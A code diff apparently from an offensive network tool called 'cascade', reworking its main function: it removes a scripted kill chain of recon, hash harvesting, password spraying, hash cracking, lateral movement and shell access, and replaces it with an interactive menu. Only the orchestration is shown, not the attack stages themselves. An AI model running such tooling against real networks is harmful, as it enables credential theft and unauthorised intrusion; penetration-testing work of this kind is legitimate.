-    ap.add_argument("--wordlist",           metavar="FILE",
-                    help="Custom wordlist for hash cracking")
-    ap.add_argument("-v", "--verbose",      action="store_true",
-                    help="Verbose output")
-    ap.add_argument("--about",              action="store_true",
-                    help="Detailed explanation of all stages")
-    ap.add_argument("--shells",             action="store_true",
-                    help="Open saved session manager directly")
-    ap.add_argument("--version",            action="version",
+    ap.add_argument("--version", action="version",
                     version=f"cascade {__import__('cascade').__version__}")
-    args = ap.parse_args()
+    ap.parse_args()
 
-    if args.about:
-        _print_about()
-        sys.exit(0)
-
-    if args.shells:
-        tui.clear()
-        tui.print_banner()
-        shells.saved_menu()
-        sys.exit(0)
+    state = State()
+    # Pick first interface that has an IP as default
+    for i in iface.list_interfaces():
+        if i["ip"] and i["name"] != "lo":
+            state.interface = i["name"]
+            break
 
     tui.clear()
     tui.print_banner()
-
-    # ── dependency check ───────────────────────────────────────────────────────
-    missing = _check_deps(skip_harvest=args.no_harvest)
-    if missing:
-        tui.warn("Missing tools — install before running:")
-        for tool, cmd in missing:
-            print(f"    {tui.RED}{tui.B}{tool:<20}{tui.R}  {tui.DIM}{cmd}{tui.R}")
-        print()
-        cont = input(f"  {tui.WH}Continue anyway? [y/N] {tui.R}").strip().lower()
-        if cont != "y":
-            sys.exit(1)
-        print()
-
-    # ── single-stage mode ──────────────────────────────────────────────────────
-    if args.stage:
-        stage_map = {
-            1: lambda: stage1_recon(args),
-            2: lambda: stage2_harvest(args),
-            3: lambda: (stage3_spray(stage1_recon(args), args)),
-            4: lambda: stage4_crack([], args),
-            5: lambda: stage5_lateral([], [], args),
-        }
-        stage_map[args.stage]()
-        sys.exit(0)
-
-    # ── full kill chain ────────────────────────────────────────────────────────
-    hosts       = []
-    hashes      = []
-    spray_creds = []
-    cracked     = []
-    pivots      = []
-
-    try:
-        hosts       = stage1_recon(args)
-        hashes      = stage2_harvest(args)
-        spray_creds = stage3_spray(hosts, args)
-        cracked     = stage4_crack(hashes, args)
-
-        all_creds = spray_creds + [
-            {"target": "N/A", "service": "ntlmv2",
-             "user": c["user"], "secret": c["password"]}
-            for c in cracked
-        ]
-        pivots = stage5_lateral(hosts, all_creds, args)
-
-    except KeyboardInterrupt:
-        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")
-
-    _print_summary(hosts, hashes, spray_creds, cracked, compromised)
-
-    # ── shell manager ──────────────────────────────────────────────────────────
-    if compromised:
-        ans = input(f"  {tui.WH}{tui.B}Open shell manager? [Y/n] {tui.R}").strip().lower()
-        if ans != "n":
-            shells.access_menu(compromised)
-    elif any([spray_creds, cracked]):
-        # We have creds but lateral movement didn't confirm Pwn3d — still offer shells
-        # Build compromised list from all hosts + creds for manual attempt
-        all_creds = spray_creds + [
-            {"target": "N/A", "service": "ntlmv2",
-             "user": c["user"], "secret": c["password"]}
-            for c in cracked
-        ]
-        guesses = [{"host": h, "cred": all_creds[0]} for h in hosts
-                   if any(p in (h.get("ports") or []) for p in [22, 445, 5985])]
-        if guesses:
-            ans = input(f"  {tui.WH}{tui.B}Try manual shell with found credentials? [Y/n] {tui.R}").strip().lower()
-            if ans != "n":
-                shells.access_menu(guesses)
-
-    # Always offer saved sessions
-    ans = input(f"  {tui.WH}{tui.B}Open saved sessions? [y/N] {tui.R}").strip().lower()
-    if ans == "y":
-        shells.saved_menu()
+    main_menu(state)
 
 
 if __name__ == "__main__":
